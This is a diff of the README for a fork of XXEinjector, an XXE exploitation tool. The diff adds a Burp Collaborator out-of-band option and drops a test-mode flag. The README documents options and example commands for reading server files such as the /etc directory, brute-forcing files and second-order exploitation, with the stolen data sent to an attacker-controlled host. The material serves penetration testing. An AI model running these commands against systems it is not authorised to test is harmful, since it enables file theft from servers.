@@ -2,6 +2,8 @@
 
 XXEinjector automates retrieving files using direct and out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications.
 
+> **Fork notice:** This is a fork of [enjoiz/XXEinjector](https://github.com/enjoiz/XXEinjector) by Jakub Pałaczyński. All credit for the original tool goes to the upstream author. This fork adds a `--collab` flag for Burp Collaborator (and compatible OOB capture services), so detection can be performed without standing up a local listener.
+
 ## Options:<br />
 ```
   --host	    Mandatory - our IP address for reverse connections. (--host=192.168.0.2)
@@ -14,6 +16,7 @@ XXEinjector automates retrieving files using direct and out of band methods. Dir
   --rport	    Remote host's TCP port. Use this argument only for requests without Host header and for non-default values. (--rport=8080)
 
   --oob		    Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)
+  --collab	    Use Burp Collaborator (or any compatible OOB capture service) for OOB detection. Supply the full URL with scheme. Script sends one request and exits; view captured interactions in your Collaborator client. No local listeners are started and no Burp API is contacted. Supported schemes: http, https, ftp, gopher. (--collab=http://abc123.oastify.com)
   --direct	    Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --direct-xml to see how XML in request file should look like or --localdtd-xml if you want to use local DTD during exploitation. In case of any problems with start and end marks when special characters are present in reponse before or after output data please use Burp Proxy match and replace option to replace that. (--direct=UNIQUEMARKSTART,UNIQUEMARKEND)
   --cdata	    Improve direct exploitation with CDATA. Data is retrieved directly, however OOB is used to construct CDATA payload. Specify --cdata-xml to see how request should look like in this technique.
   --2ndfile	    File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)
@@ -34,7 +37,6 @@ XXEinjector automates retrieving files using direct and out of band methods. Dir
   --jarport	    Set custom port for uploading files using jar. (--jarport=1337)
   --xsltport	Set custom port for XSLT injection test. (--xsltport=1337)
 
-  --test	    This mode shows request with injected payload and quits. Used to verify correctness of request without sending it to a server.
   --urlencode	URL encode injected DTD. This is default for URI.
   --nodtd	    If you want to put DTD in request by yourself. Specify "--oob-xml" to show how DTD should look like.
   --output	    Output file for bruteforcing and logger mode. By default it logs to brute.log in current directory. (--output=/tmp/out.txt)
@@ -50,6 +52,8 @@ XXEinjector automates retrieving files using direct and out of band methods. Dir
   ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl
   Enumerating /etc directory using gopher for OOB method:
   ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher
+  Confirming blind XXE via Burp Collaborator (no local listener needed):
+  ruby XXEinjector.rb --file=/tmp/req.txt --collab=http://abc123.oastify.com --ssl
   Second order exploitation:
   ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt
   Bruteforcing files using HTTP out of band method and netdoc protocol:
